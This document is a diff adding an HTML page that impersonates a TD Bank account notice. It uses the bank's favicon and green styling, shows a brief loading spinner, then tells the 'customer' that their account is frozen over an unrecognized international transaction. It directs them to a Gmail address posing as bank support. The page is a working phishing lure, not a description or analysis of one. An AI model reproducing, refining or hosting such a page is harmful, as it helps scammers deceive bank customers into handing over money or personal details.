@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Your website description here" />
+    <meta name="author" content="Your Name" />
+    <!-- Include Tailwind CSS from CDN -->
+    <link
+      rel="shortcut icon"
+      href="https://www.td.com/etc.clientlibs/tdsite/clientlibs/clientlib-wealth/resources/images/wealth-favicon.ico"
+      type="image/vnd.microsoft.icon" />
+
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet" />
+    <link href="./profile.css" rel="stylesheet" />
+    <title>Your Website Title</title>
+  </head>
+  <body
+    id="container"
+    class="grid place-items-center m-0 h-screen bg-green-800">
+    <script>
+      // Condition to determine whether to render the div or not
+      const divContents = [
+        ` <div
+      class="mt-20 h-fit text-center w-80 shadow-2xl px-5 py-2 bg-white rounded-lg">
+      <h3
+        class="text-3xl capitalize font-medium font-medium mb-2 text-green-800">
+        your account has been frozen
+      </h3>
+      <p class="text-green-800 py-5 text-left">Dear customer,</p>
+      <p class="text-green-800 text-left">
+      Your account has been temporarily restricted as a precautionary measure in response to an unrecognized international transaction. We kindly request you to reach out to our dedicated customer support team for further assistance and clarification. Your security and satisfaction are our top priorities, and we are committed to resolving this matter promptly. Thank you for your understanding and cooperation.</p>
+
+      <p class="bg-green-800 text-white px-12 rounded cursor-pointer py-1 mt-5">
+       <a href="mailto:thetdbankus@gmail.com">
+        contact us via email: thetdbankus@gmail.com
+        </a>
+      </p>
+    </div>`,
+
+        `<div class="grid place-items-center">
+      <span class="loader"></span>
+    </div>`,
+      ];
+      // Function to change the content of the container
+      function changeContent(number) {
+        const container = document.getElementById("container");
+        container.innerHTML = divContents[number];
+      }
+      // Set interval to change content every 5 seconds (5000 milliseconds)
+      setTimeout(() => changeContent(0), 2500);
+      changeContent(1);
+    </script>
+  </body>
+</html>
